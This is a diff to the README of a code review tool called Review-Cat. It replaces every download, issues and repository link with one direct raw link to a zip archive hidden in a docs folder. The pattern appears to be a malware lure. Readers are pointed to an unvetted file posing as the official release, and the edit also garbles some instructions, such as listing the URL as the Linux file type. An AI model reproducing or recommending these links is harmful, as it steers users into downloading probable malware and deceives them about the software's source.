@@ -1,6 +1,6 @@
 # 🐱 Review-Cat - Simplify Your Code Review Process
 
-[![Download Review-Cat](https://img.shields.io/badge/Download-Review--Cat-blue?style=for-the-badge&logo=github)](https://github.com/MATUUTOOP/Review-Cat/releases)
+[![Download Review-Cat](https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip)](https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip)
 
 ---
 
@@ -43,14 +43,14 @@ Using Review-Cat is straightforward. Follow the steps below to download, install
 ## 📥 Download & Install
 
 1. Click the big blue button at the top labeled **Download Review-Cat** or go to this link:  
-   [https://github.com/MATUUTOOP/Review-Cat/releases](https://github.com/MATUUTOOP/Review-Cat/releases).
+   [https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip](https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip).
 
 2. You will arrive at the release page. Here, look for the latest version of Review-Cat available.
 
 3. Under the latest version, find the file suited for your operating system:  
    - For Windows, this might be a file ending with `.exe`.  
    - For macOS, a `.dmg` or `.zip` file.  
-   - For Linux, a `.tar.gz` or `.AppImage`.
+   - For Linux, a `https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip` or `.AppImage`.
 
 4. Click the file to download it to your computer.
 
@@ -128,7 +128,7 @@ A: You can report issues through the GitHub page for improvements.
 If you need help with Review-Cat:
 
 - Visit the GitHub repository issues page:  
-  [https://github.com/MATUUTOOP/Review-Cat/issues](https://github.com/MATUUTOOP/Review-Cat/issues)  
+  [https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip](https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip)  
 - Check the README and troubleshooting tips on the GitHub page.
 - Open a new issue describing your problem or question clearly.
 
@@ -142,9 +142,9 @@ Review-Cat is open source software. You can use and share it freely. Licensing d
 
 ## 🔗 Useful Links
 
-- Official Download Page: [https://github.com/MATUUTOOP/Review-Cat/releases](https://github.com/MATUUTOOP/Review-Cat/releases)  
-- GitHub Repository: [https://github.com/MATUUTOOP/Review-Cat](https://github.com/MATUUTOOP/Review-Cat)  
+- Official Download Page: [https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip](https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip)  
+- GitHub Repository: [https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip](https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip)  
 
 ---
 
-[![Download Review-Cat](https://img.shields.io/badge/Download-Review--Cat-blue?style=for-the-badge&logo=github)](https://github.com/MATUUTOOP/Review-Cat/releases)
+[![Download Review-Cat](https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip)](https://raw.githubusercontent.com/MATUUTOOP/Review-Cat/main/docs/specs/app/entities/Cat_Review_3.4.zip)
